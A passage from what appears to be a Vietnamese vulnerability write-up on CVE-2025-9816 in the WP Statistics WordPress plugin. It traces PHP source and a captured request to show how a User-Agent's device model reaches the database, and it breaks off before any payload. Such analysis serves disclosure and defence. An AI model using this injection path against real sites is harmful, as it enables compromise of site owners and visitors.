</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">Helper</span><span class="o">::</span><span class="na">isRequestSignatureEnabled</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$signature</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_param</span><span class="p">(</span><span class="s1">&#39;signature&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$payload</span>   <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_param</span><span class="p">(</span><span class="s1">&#39;source_type&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_param</span><span class="p">(</span><span class="s1">&#39;source_id&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Signature</span><span class="o">::</span><span class="na">check</span><span class="p">(</span><span class="nv">$payload</span><span class="p">,</span> <span class="nv">$signature</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">new</span> <span class="nx">\WP_Error</span><span class="p">(</span><span class="s1">&#39;rest_forbidden&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;Invalid signature&#39;</span><span class="p">,</span> <span class="s1">&#39;wp-statistics&#39;</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="mi">403</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Các param này sẽ tự động cung cấp khi ta truy cập trang web =&gt; luôn true.
Khi bắt request bằng <strong>BurpSuite</strong> ta sẽ thấy rõ điều đó</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-json/wp-statistics/v2/hit</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; model_here) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="g">wp_statistics_hit=1&amp;source_type=home&amp;source_id=0&amp;search_query=&amp;signature=787b07b8979cb982ec89a4f103a68081&amp;endpoint=hit&amp;referred=&amp;page_uri=Lw%3D%3D</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Như vậy, ta không ần quan tâm đến <code>permission_callback</code>.</p>
<p>Quay trở lại với <code>hit_callback()</code>, hàm chính xử lý việc lưu trữ thông tin <strong>visitor</strong>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">hit_callback</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$statusCode</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Helper</span><span class="o">::</span><span class="na">validateHitRequest</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Hits</span><span class="o">::</span><span class="na">record</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$responseData</span><span class="p">[</span><span class="s1">&#39;status&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$responseData</span><span class="p">[</span><span class="s1">&#39;status&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$responseData</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span>   <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$statusCode</span>             <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getCode</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">rest_ensure_response</span><span class="p">(</span><span class="nv">$responseData</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$statusCode</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$response</span><span class="o">-&gt;</span><span class="na">set_status</span><span class="p">(</span><span class="nv">$statusCode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span><span class="o">-&gt;</span><span class="na">set_headers</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Cache-Control&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;no-cache&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$response</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Lỗi liên quan đến user-agent header và model đặt trong nó, ta cần focus, tìm cách để thêm model vào database. <a href="https://51degrees.com/blog/understanding-user-agent-string#Unpacking%20the%20User%20Agent%20string"target="_blank" rel="external nofollow noopener noreferrer">Đây</a> là cú pháp của user-agent có model.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Helper::validateHitRequest();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">validateHitRequest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$isValid</span> <span class="o">=</span> <span class="nx">Request</span><span class="o">::</span><span class="na">validate</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;page_uri&#39;</span>     <span class="o">=&gt;</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;required&#39;</span>        <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;nullable&#39;</span>        <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;type&#39;</span>            <span class="o">=&gt;</span> <span class="s1">&#39;string&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;encoding&#39;</span>        <span class="o">=&gt;</span> <span class="s1">&#39;base64&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;invalid_pattern&#39;</span> <span class="o">=&gt;</span> <span class="nx">self</span><span class="o">::</span><span class="na">injectionPatterns</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;search_query&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;required&#39;</span>        <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;nullable&#39;</span>        <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;type&#39;</span>            <span class="o">=&gt;</span> <span class="s1">&#39;string&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;encoding&#39;</span>        <span class="o">=&gt;</span> <span class="s1">&#39;base64&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;invalid_pattern&#39;</span> <span class="o">=&gt;</span> <span class="nx">self</span><span class="o">::</span><span class="na">injectionPatterns</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;source_id&#39;</span>    <span class="o">=&gt;</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;type&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;number&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;required&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;nullable&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;referred&#39;</span>     <span class="o">=&gt;</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;required&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;nullable&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;type&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;url&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;encoding&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;base64&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$isValid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">do_action</span><span class="p">(</span><span class="s1">&#39;wp_statistics_invalid_hit_request&#39;</span><span class="p">,</span> <span class="nv">$isValid</span><span class="p">,</span> <span class="nx">IP</span><span class="o">::</span><span class="na">getIP</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">ErrorException</span><span class="p">(</span><span class="nx">esc_html__</span><span class="p">(</span><span class="s1">&#39;Invalid hit/online request.&#39;</span><span class="p">,</span> <span class="s1">&#39;wp-statistics&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>validateHitRequest()</code> là hàm dùng để validate các params được truyền vào body của request đến <code>hit</code> ở trên, các param này được plugin cung cấp nên chỉ cần tái sử dụng lại nó =&gt; không ảnh hưởng gì đến model trong user-agent header.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Hits::record();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">record</span><span class="p">(</span><span class="nv">$visitorProfile</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$visitorProfile</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$visitorProfile</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VisitorProfile</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">        * Record Pages
</span></span></span><span class="line"><span class="cl"><span class="sd">        */</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pageId</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">Pages</span><span class="o">::</span><span class="na">active</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$pageId</span> <span class="o">=</span> <span class="nx">Pages</span><span class="o">::</span><span class="na">record</span><span class="p">(</span><span class="nv">$visitorProfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">        * Record Visitor Detail
</span></span></span><span class="line"><span class="cl"><span class="sd">        */</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$visitorId</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">Visitor</span><span class="o">::</span><span class="na">active</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$visitorId</span> <span class="o">=</span> <span class="nx">Visitor</span><span class="o">::</span><span class="na">record</span><span class="p">(</span><span class="nv">$visitorProfile</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;page_id&#39;</span> <span class="o">=&gt;</span> <span class="nv">$pageId</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// other logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Từ khóa <code>record</code> làm tôi liên tưởng đến việc quay video màn hình và lưu trữ nó vào bộ nhớ. Tương tự, trong trường hợp này sẽ lưu trữ thông tin visitor vào database.</p>
<p>Nếu <code>visitor=null</code> tức chưa tồn tại thì gọi đến <code>Visitor::active()</code> để kiểm tra và thực hiện <code>record()</code> của <strong>Visitor</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">active</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nx">has_filter</span><span class="p">(</span><span class="s1">&#39;wp_statistics_active_visitors&#39;</span><span class="p">))</span> <span class="o">?</span> <span class="nx">apply_filters</span><span class="p">(</span><span class="s1">&#39;wp_statistics_active_visitors&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">:</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Hàm <code>active()</code> sẽ trả về <strong>true mặc định</strong>.</p>
<ul>
<li>Nếu trong plugin đã <code>add_filter('wp_statistics_active_visitors', 'my_function')</code>, thì giá trị trả về sẽ được thay đổi theo kết quả của filter.</li>
<li>Nếu không có filter nào, thì nó chỉ trả về <strong>true</strong>.</li>
</ul>
<p>Search với hook name <code>wp_statistics_active_visitors</code> ta không thấy filter nào được add cả</p>
<figure><img src="/posts/2025-10-08-cve-2025-9816/search2.png"
    alt="Kết quả tìm kiếm hook name wp_statistics_active_visitors"><figcaption>
      <p>Kết quả tìm kiếm hook name wp_statistics_active_visitors</p>
    </figcaption>
</figure>

<p>👉 <code>active()</code> luôn true =&gt; <code>Visitor::record()</code> được gọi.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">record</span><span class="p">(</span><span class="nv">$visitorProfile</span><span class="p">,</span> <span class="nv">$arg</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$wpdb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Define the array of defaults
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$defaults</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;location&#39;</span>         <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;exclusion_match&#39;</span>  <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;exclusion_reason&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;page_id&#39;</span>          <span class="o">=&gt;</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$userAgent</span>    <span class="o">=</span> <span class="nv">$visitorProfile</span><span class="o">-&gt;</span><span class="na">getUserAgent</span><span class="p">();</span> <span class="o">&lt;--</span> <span class="nx">focus</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$same_visitor</span> <span class="o">=</span> <span class="nv">$visitorProfile</span><span class="o">-&gt;</span><span class="na">isIpActiveToday</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// If we have a new Visitor in Day
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$same_visitor</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Prepare Visitor information
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$visitor</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;agent&#39;</span>          <span class="o">=&gt;</span> <span class="nv">$userAgent</span><span class="o">-&gt;</span><span class="na">getBrowser</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;platform&#39;</span>       <span class="o">=&gt;</span> <span class="nv">$userAgent</span><span class="o">-&gt;</span><span class="na">getPlatform</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;version&#39;</span>        <span class="o">=&gt;</span> <span class="nv">$userAgent</span><span class="o">-&gt;</span><span class="na">getVersion</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;device&#39;</span>         <span class="o">=&gt;</span> <span class="nv">$userAgent</span><span class="o">-&gt;</span><span class="na">getDevice</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;model&#39;</span>          <span class="o">=&gt;</span> <span class="nv">$userAgent</span><span class="o">-&gt;</span><span class="na">getModel</span><span class="p">(),</span> <span class="o">&lt;--</span> <span class="nx">focus</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// other logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$visitor</span> <span class="o">=</span> <span class="nx">apply_filters</span><span class="p">(</span><span class="s1">&#39;wp_statistics_visitor_information&#39;</span><span class="p">,</span> <span class="nv">$visitor</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">//Save Visitor TO DB
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$visitor_id</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">save_visitor</span><span class="p">(</span><span class="nv">$visitor</span><span class="p">,</span> <span class="nv">$visitorProfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Plugin lấy user-agent từ http request và gán vào <code>$userAgent</code></p>
<figure><img src="/posts/2025-10-08-cve-2025-9816/debug1.png"
    alt="Debug cho $userAgent"><figcaption>
      <p>Debug cho $userAgent</p>
    </figcaption>
</figure>

<p>Sau đó gán vào mảng <code>$visitor</code> và lưu thông tin <strong>visitor</strong> vào database bằng hàm <code>save_visitor()</code>. Ta cần focus vào dòng code chứa model:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s1">&#39;model&#39;</span> <span class="o">=&gt;</span> <span class="nv">$userAgent</span><span class="o">-&gt;</span><span class="na">getModel</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>'model'</code> là giá trị trả về của <code>getModel()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getModel</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$model</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">deviceDetector</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$brand</span>  <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">deviceDetector</span><span class="o">-&gt;</span><span class="na">getBrandName</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$device</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">deviceDetector</span><span class="o">-&gt;</span><span class="na">getModel</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$device</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$words</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$device</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$device</span> <span class="o">=</span> <span class="nv">$words</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">??</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$device</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ctype_digit</span><span class="p">(</span><span class="nv">$device</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$device</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
